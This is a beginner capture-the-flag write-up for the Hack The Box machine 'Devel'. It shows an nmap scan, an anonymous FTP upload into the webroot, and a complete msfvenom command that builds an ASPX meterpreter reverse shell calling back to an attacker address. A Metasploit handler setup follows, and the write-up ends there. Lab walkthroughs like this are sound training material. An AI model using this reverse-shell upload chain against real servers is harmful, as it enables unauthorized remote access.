Hack The Box - Devel

Quick Summary

Devel is a machine, another simple beginner Windows target. I’ll use anonymous access to FTP in the webroot of the machine and next using reverse conections with metasploit will gain target access. It is a beginner-level machine which its IP address is 10.10.10.5. Let’s go to hack!!!

Nmap

As always we will start with nmap to scan for open ports and services, with the option -sCfor show us information about vulnerabilities:


Nmap reveals Service ftpd on port 21 with anonymous login and http service on ports 80/tcp. Verifying the anonymous conection with ftp service.

1.) To create a file test.txt and put inside some...
2.) Open conection ftp and login with username/password anonymous:anonymous
3.) Type command bin and with put the file to the server.
4.) With command curl will check the file uploaded.

The apppool\web is an user with minimum privileges, then a shell generated by web shell could not be work. We will need to get privileges.

Exploit

For exploit we need to generate a payload code and launch metasploit.
1.) Generate a payload: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.21 LPORT=4444 -f aspx > reverse.aspx
2.) Upload the payload reverse.aspx by ftp service
3.) Launch metasploit and use exploit/multi/handle with your localhost, in my case 10.10.14.21.
4.) Set payload with set payload windows/meterpreter/reverse_tcp
